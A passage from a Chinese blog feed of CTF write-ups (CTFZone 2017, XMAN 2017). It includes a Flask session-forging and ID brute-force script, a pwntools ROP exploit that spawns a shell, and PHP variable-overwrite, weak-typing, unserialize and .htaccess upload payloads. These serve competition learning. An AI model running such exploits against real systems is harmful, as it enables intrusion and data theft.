<p>现在我们就可以利用这个脚本来伪造cookie了，比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/flask-session-cookie-manager# python session_cookie_manager.py encode -s &apos;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&apos; -t &apos;&#123;&quot;username&quot;:&quot;chybeta&quot;,&quot;number&quot;:&quot;326410031725&quot;&#125;&apos;</div><div class="line"></div><div class="line">eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOekkxIn0sInVzZXJuYW1lIjp7IiBiIjoiWTJoNVltVjBZUT09In19.DEh3qQ.yq3ZCE5Mpoy74D9e3wkfbbenU1E</div></pre></td></tr></table></figure></p>
<p>现在我们利用下面这个脚本，来获取admin的各条信息，number的上下限是通过测试出来的。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># standard imports</span></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> zlib</div><div class="line"><span class="keyword">import</span> ast</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</div><div class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line">reload(sys)</div><div class="line">sys.setdefaultencoding(<span class="string">'utf-8'</span>)</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">MockApp</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, secret_key)</span>:</span></div><div class="line">        self.secret_key = secret_key</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">session_cookie_encoder</span><span class="params">(secret_key, session_cookie_structure)</span>:</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        app = MockApp(secret_key)</div><div class="line">        session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</div><div class="line">        si = SecureCookieSessionInterface()</div><div class="line">        s = si.get_signing_serializer(app)</div><div class="line"></div><div class="line">        <span class="keyword">return</span> s.dumps(session_cookie_structure)</div><div class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">        <span class="keyword">return</span> <span class="string">"[Encoding error]&#123;&#125;"</span>.format(e)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    number_min = <span class="number">326410000000</span></div><div class="line">    number_max = <span class="number">326410030240</span></div><div class="line"></div><div class="line">    <span class="keyword">for</span> number <span class="keyword">in</span>  range(number_min,number_max):</div><div class="line">        file_message = open(<span class="string">"message.txt"</span>,<span class="string">'w'</span>)</div><div class="line">        secret_key = <span class="string">".&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d"</span></div><div class="line">        cookie_structure = <span class="string">"&#123;'username':'admin','number':"</span>+ str(number) + <span class="string">"&#125;"</span></div><div class="line">        session  = session_cookie_encoder(secret_key, cookie_structure)</div><div class="line">        cookie = &#123;<span class="string">'session'</span>:session&#125;</div><div class="line">        url = <span class="string">"http://82.202.204.104/messages"</span></div><div class="line">        content = requests.get(url,cookies=cookie)</div><div class="line">        start_index = content.text.find(<span class="string">'&lt;span class="message"&gt;'</span>)+len(<span class="string">'&lt;span class="message"&gt;'</span>)</div><div class="line">        end_index = content.text.find(<span class="string">'&lt;/span&gt;\n    &lt;/div&gt;\n  &lt;/body&gt;\n&lt;/html&gt;'</span>)</div><div class="line">        <span class="keyword">if</span> <span class="string">"You have no messages yet"</span> <span class="keyword">not</span> <span class="keyword">in</span> content.text:</div><div class="line">            <span class="keyword">print</span> number</div><div class="line">            file_message.writelines(str(number)+<span class="string">":"</span>+str(content.text[start_index:end_index]))</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">continue</span></div><div class="line"></div><div class="line">file_message.close()</div></pre></td></tr></table></figure></p>
<p>在message.txt中查找：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/flask-session-cookie-manager# cat message.txt | grep &quot;http&quot;</div><div class="line">It&amp;#39;s so cool! https://postimg.org/image/41t4h680r/</div></pre></td></tr></table></figure></p>
<p><img src="https://s17.postimg.org/l2c0pul25/photo_2017-07-14_18-44-51.jpg" alt=""><br>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ctfzone&#123;b1d4207ff1965105af775cfa71d8214d&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CTFZone-2017-Leaked messages-writeup&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="CTFZone" scheme="http://yoursite.com/tags/CTFZone/"/>
    
  </entry>
  
  <entry>
    <title>XMAN选拔赛-2017-misc-writeup</title>
    <link href="http://yoursite.com/2017/07/17/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-misc-writeup/"/>
    <id>http://yoursite.com/2017/07/17/XMAN选拔赛-2017-misc-writeup/</id>
    <published>2017-07-17T13:37:52.000Z</published>
    <updated>2017-07-28T07:22:45.777Z</updated>
    
    <content type="html"><![CDATA[<p>XMAN选拔赛-2017-misc-writeup<br><a id="more"></a></p>
<h1 id="Pretty-Cat"><a href="#Pretty-Cat" class="headerlink" title="Pretty_Cat"></a>Pretty_Cat</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">好可爱的喵</div><div class="line">附件下载</div></pre></td></tr></table></figure>
<p>strings看一下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/Desktop# strings e539200b-6833-4ff1-96b8-11bff3e1e740.jpg</div><div class="line">JFIF</div><div class="line">pExif</div><div class="line">WE1BTntVNWU=</div><div class="line">XzN4MWZ0b28xfQ==</div><div class="line"> , #&amp;&apos;)*)</div></pre></td></tr></table></figure></p>
<p>对两个base64加密串进行解密并拼接。得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">XMAN&#123;U5e_3x1ftoo1&#125;</div></pre></td></tr></table></figure></p>
<h1 id="FlagFlagFlag"><a href="#FlagFlagFlag" class="headerlink" title="FlagFlagFlag"></a>FlagFlagFlag</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Anyone wants to get flag?</div><div class="line"></div><div class="line">hint1 :　https://pan.baidu.com/s/1bSiQbO</div><div class="line">hint2 :  Pkcrack</div></pre></td></tr></table></figure>
<h1 id="Pdf-Hack"><a href="#Pdf-Hack" class="headerlink" title="Pdf_Hack"></a>Pdf_Hack</h1>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;XMAN选拔赛-2017-misc-writeup&lt;br&gt;
    
    </summary>
    
      <category term="writeup:MISC" scheme="http://yoursite.com/categories/writeup-MISC/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="misc" scheme="http://yoursite.com/tags/misc/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>XMAN选拔赛-2017-pwn-writeup</title>
    <link href="http://yoursite.com/2017/07/16/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-pwn-writeup/"/>
    <id>http://yoursite.com/2017/07/16/XMAN选拔赛-2017-pwn-writeup/</id>
    <published>2017-07-16T11:58:11.000Z</published>
    <updated>2017-07-17T13:44:46.558Z</updated>
    
    <content type="html"><![CDATA[<p>XMAN选拔赛-2017-pwn-writeup。<br><a id="more"></a></p>
<h1 id="Raaa"><a href="#Raaa" class="headerlink" title="Raaa"></a>Raaa</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Are you ok? Do you like mifan?</div><div class="line">nc challenges.xctf.org.cn 14005</div></pre></td></tr></table></figure>
<p>太简单。rand()。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</div><div class="line">	<span class="keyword">int</span> a = rand() ^ <span class="number">590558003</span>;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"%d\n"</span>, a);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>得到1220048468，输入。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">(venv) chybeta@ubuntu:~/pwn/ctf/XMAN2017/pwn/Raaa$ nc challenges.xctf.org.cn 14005</div><div class="line">1220048468</div><div class="line">XMAN&#123;Have_y0u_ever_heard_of_AnLi,my_fr1end?&#125;</div><div class="line">heiheiehi!</div></pre></td></tr></table></figure></p>
<h1 id="Baaa"><a href="#Baaa" class="headerlink" title="Baaa"></a>Baaa</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">If you give me three days light。</div><div class="line">nc challenges.xctf.org.cn 14002</div></pre></td></tr></table></figure>
<p>没给程序：）。好吧google大法好。发现是16年CSAW-warmup原题。<a href="https://www.megabeets.net/csaw-2016-pwn-warmup-writeup/" target="_blank" rel="external">https://www.megabeets.net/csaw-2016-pwn-warmup-writeup/</a></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170716/2.png?raw=true" alt=""><br>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">XMAN&#123;Ba1a1a_Xiao_Mo_Xian,BianBIanBian&#125;</div></pre></td></tr></table></figure></p>
<h1 id="Caaa"><a href="#Caaa" class="headerlink" title="Caaa"></a>Caaa</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">一心想学bin的张日天报名了xman，开学的时候老师让大家自我介绍：</div><div class="line">老师（手上拿着名单册子）：好，下一位，请*言简意赅*的介绍自己</div><div class="line"></div><div class="line">nc challenges.xctf.org.cn 14000</div></pre></td></tr></table></figure>
<p><img src="" alt=""></p>
<p>很明显的栈溢出，64位rop。溢出点用pattern生成后，在gdb中<code>x/gx $rsp</code>查看再带回pattern即可求出偏移为40。要是直接看IDA的话，buf的位置在<code>bp-20h</code>，0x20+8=40，也确实是40个字节。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = process(<span class="string">"./2ddf143c-dd2f-4ce0-9409-9e8f72f5364a.bin"</span>)</div><div class="line"><span class="comment"># p = remote("challenges.xctf.org.cn","14000")</span></div><div class="line">elf = ELF(<span class="string">"./2ddf143c-dd2f-4ce0-9409-9e8f72f5364a.bin"</span>)</div><div class="line">system_addr = elf.symbols[<span class="string">'system'</span>]</div><div class="line">pop_rdi_ret = <span class="number">0x0000000000400973</span></div><div class="line">sh_addr = next(elf.search(<span class="string">'/bin/sh\x00'</span>))</div><div class="line">offset = <span class="number">40</span></div><div class="line"></div><div class="line">p.recv()</div><div class="line">p.sendline(<span class="string">"1"</span>)</div><div class="line">p.recv()</div><div class="line"></div><div class="line">payload = <span class="string">'a'</span> * offset</div><div class="line">payload += p64(pop_rdi_ret)</div><div class="line">payload += p64(sh_addr)</div><div class="line">payload += p64(system_addr)</div><div class="line"></div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">(venv) chybeta@ubuntu:~/pwn/ctf/XMAN2017/pwn/Caaa$ python exp.py</div><div class="line">[+] Opening connection to challenges.xctf.org.cn on port 14000: Done</div><div class="line">[*] &apos;/home/chybeta/pwn/ctf/XMAN2017/pwn/Caaa/2ddf143c-dd2f-4ce0-9409-9e8f72f5364a.bin&apos;</div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX disabled</div><div class="line">    PIE:      No PIE</div><div class="line">[*] Switching to interactive mode</div><div class="line">1</div><div class="line">your name is:</div><div class="line">hello, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaas    @!</div><div class="line">$ cat /home/xman/flag</div><div class="line">xman&#123;Welcome_to_bin_world!&#125;$</div></pre></td></tr></table></figure>
<p>剩下的pwn题，好像都是跟堆有关的。还不会，暂时就不写了。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;XMAN选拔赛-2017-pwn-writeup。&lt;br&gt;
    
    </summary>
    
      <category term="二进制安全" scheme="http://yoursite.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>XMAN选拔赛-2017-web-writeup</title>
    <link href="http://yoursite.com/2017/07/16/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-web-writeup/"/>
    <id>http://yoursite.com/2017/07/16/XMAN选拔赛-2017-web-writeup/</id>
    <published>2017-07-16T03:03:50.000Z</published>
    <updated>2017-07-26T10:57:48.239Z</updated>
    
    <content type="html"><![CDATA[<p>XMAN选拔赛-2017-web-writeup 都是基础题目<br><a id="more"></a></p>
<h1 id="variacover"><a href="#variacover" class="headerlink" title="variacover"></a>variacover</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_GET[<span class="string">'b'</span>])) &#123;</div><div class="line">   show_source(<span class="keyword">__FILE__</span>);</div><div class="line">   <span class="keyword">die</span>();</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">   <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</div><div class="line">$a = <span class="string">"www.XMAN.com"</span>;</div><div class="line">$b = $_GET[<span class="string">'b'</span>];</div><div class="line">@parse_str($b);</div><div class="line"><span class="keyword">if</span> ($a[<span class="number">0</span>] != <span class="string">'QNKCDZO'</span> &amp;&amp; md5($a[<span class="number">0</span>]) == md5(<span class="string">'QNKCDZO'</span>)) &#123;</div><div class="line">   <span class="keyword">echo</span> $flag;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">exit</span>(<span class="string">'你的答案不对0.0'</span>);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>parse_str变量覆盖漏洞，和php弱类型比较问题。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://challenges.xctf.org.cn:7771/?b=a[0]=240610708</div></pre></td></tr></table></figure>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">XMAN&#123;A_sTr_covcderd_t3st_you_oW?&#125;</div></pre></td></tr></table></figure></p>
<h1 id="urldecode"><a href="#urldecode" class="headerlink" title="urldecode"></a>urldecode</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170716/1.jpg?raw=true" alt=""></p>
<p>改为XMAN后提示urldecode：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170716/2.jpg?raw=true" alt=""></p>
<p>考点应该是类似二次注入类型，<br>将XMAN进行一次urlencode，再把其中的%替换为%25，最后的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://challenges.xctf.org.cn:7772/?me=%2558%254d%2541%254e</div></pre></td></tr></table></figure></p>
<p>得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">XMAN&#123;UrlDeCode_CooL_yOu_u0D3rSta9D!</div></pre></td></tr></table></figure></p>
<h1 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h1><p>比赛时没做这题。<br>.htaccess。先自己新建一个文件<code>.htaccess</code>，内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;FilesMatch &quot;_chybeta.gif&quot;&gt;</div><div class="line">SetHandler application/x-httpd-php</div><div class="line">&lt;/FilesMatch&gt;</div></pre></td></tr></table></figure></p>
<p>然后现在要上传跟我说已经exist了。好吧GG。比赛结束后没人维护了。</p>
<h1 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h1><p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://challenges.xctf.org.cn:7774/?code=1</div></pre></td></tr></table></figure></p>
<p>得到hint: flag.php。访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://challenges.xctf.org.cn:7774/flag.php</div></pre></td></tr></table></figure></p>
<p>得到hint2: help.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://challenges.xctf.org.cn:7774/help.php</div></pre></td></tr></table></figure></p>
<p>得到hint3：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">class FileClass&#123; public $filename = &apos;error.log&apos;; public function __toString()&#123; return file_get_contents($this-&gt;filename); &#125; &#125;</div></pre></td></tr></table></figure></p>
<p>知道是反序列化问题，用下面代码生成：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileClass</span></span>&#123;</div><div class="line">	<span class="keyword">public</span> $filename = <span class="string">'error.log'</span>;</div><div class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</div><div class="line">		<span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$chybeta = <span class="keyword">new</span> FileClass();</div><div class="line">$chybeta-&gt;filename = <span class="string">'flag.php'</span>;</div><div class="line"><span class="keyword">echo</span> serialize($chybeta);</div></pre></td></tr></table></figure></p>
<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://challenges.xctf.org.cn:7774/?code=O:9:&quot;FileClass&quot;:1:&#123;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125;</div></pre></td></tr></table></figure></p>
<p>最后flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">XMAN&#123;UUNser1AL1Z3_XMAN__0)(0&#125;</div></pre></td></tr></table></figure></p>
<p>这题源码：<br>index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_GET[<span class="string">'code'</span>]))&#123;</div><div class="line"><span class="keyword">exit</span>(<span class="string">'?code='</span>);</div><div class="line">&#125;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileClass</span></span>&#123;</div><div class="line">    <span class="keyword">public</span> $filename = <span class="string">'error.log'</span>;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</div><div class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;  </div><div class="line">    <span class="keyword">public</span> $name = <span class="string">''</span>;  </div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>  </span></div><div class="line">    &#123;  </div><div class="line">        <span class="keyword">return</span> <span class="string">'User '</span> . <span class="keyword">$this</span>-&gt;name . <span class="string">' is '</span> . <span class="keyword">$this</span>-&gt;age . <span class="string">' years old. &lt;br /&gt;'</span>;  </div><div class="line">    &#125;  </div><div class="line">&#125;</div><div class="line"><span class="keyword">echo</span> <span class="string">"hint: flag.php"</span>;</div><div class="line">$obj = unserialize($_GET[<span class="string">'code'</span>]);</div><div class="line"><span class="keyword">echo</span> $obj;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><p>扫到index.php~，源码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$a=<span class="number">0</span>;</div><div class="line">$b=<span class="number">0</span>;</div><div class="line">$c=<span class="number">0</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'aaa'</span>]))</div><div class="line">&#123;</div><div class="line">        $aaa = $_GET[<span class="string">'aaa'</span>];</div><div class="line">		$aaa==<span class="string">"1"</span>?<span class="keyword">die</span>(<span class="string">"Emmm..."</span>):<span class="keyword">NULL</span>;</div><div class="line">        <span class="keyword">switch</span> ($aaa)</div><div class="line">        &#123;</div><div class="line">        <span class="keyword">case</span> <span class="number">0</span>:</div><div class="line">        <span class="keyword">case</span> <span class="number">1</span>:</div><div class="line">                $a=<span class="number">1</span>;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">&#125;</div><div class="line">$bbb=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'bbb'</span>]);</div><div class="line"><span class="keyword">if</span>(is_array($bbb))&#123;</div><div class="line">    is_numeric(@$bbb[<span class="string">"ccc"</span>])?<span class="keyword">die</span>(<span class="string">"Emmm..."</span>):<span class="keyword">NULL</span>;</div><div class="line">    <span class="keyword">if</span>(@$bbb[<span class="string">"ccc"</span>])&#123;</div><div class="line">        ($bbb[<span class="string">"ccc"</span>]&gt;<span class="number">2017</span>)?$b=<span class="number">1</span>:<span class="keyword">NULL</span>;</div><div class="line">    &#125;</div><div class="line">	<span class="keyword">if</span>(is_array(@$bbb[<span class="string">"ddd"</span>]))&#123;</div><div class="line">        <span class="keyword">if</span>(count($bbb[<span class="string">"ddd"</span>])!==<span class="number">2</span> <span class="keyword">OR</span> !is_array($bbb[<span class="string">"ddd"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"Emmm..."</span>);</div><div class="line">        $eee = array_search(<span class="string">"XMAN"</span>, $bbb[<span class="string">"ddd"</span>]);</div><div class="line">        $eee===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"Emmm..."</span>):<span class="keyword">NULL</span>;</div><div class="line">        <span class="keyword">foreach</span>($bbb[<span class="string">"ddd"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123;</div><div class="line">            $val===<span class="string">"XMAN"</span>?<span class="keyword">die</span>(<span class="string">"Emmm..."</span>):<span class="keyword">NULL</span>;</div><div class="line">        &#125;</div><div class="line">        $c=<span class="number">1</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>($a &amp;&amp; $b &amp;&amp; $c)&#123;</div><div class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>;</div><div class="line">    <span class="keyword">echo</span> $flag;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>考察php弱类型。payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://challenges.xctf.org.cn:8004/index.php?aaa=1abcdef&amp;bbb=&#123;&quot;ccc&quot;:&quot;2018a&quot;,&quot;ddd&quot;:[[1],0]&#125;</div></pre></td></tr></table></figure></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">XMAN&#123;PHP_IS_THE_BEST_LANGUAGE&#125;</div></pre></td></tr></table></figure></p>
<h1 id="downloaded"><a href="#downloaded" class="headerlink" title="downloaded"></a>downloaded</h1><p>用admin登陆后发现是Codiad 2.5.3，exploit-db上找到poc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.exploit-db.com/exploits/36371/</div></pre></td></tr></table></figure></p>
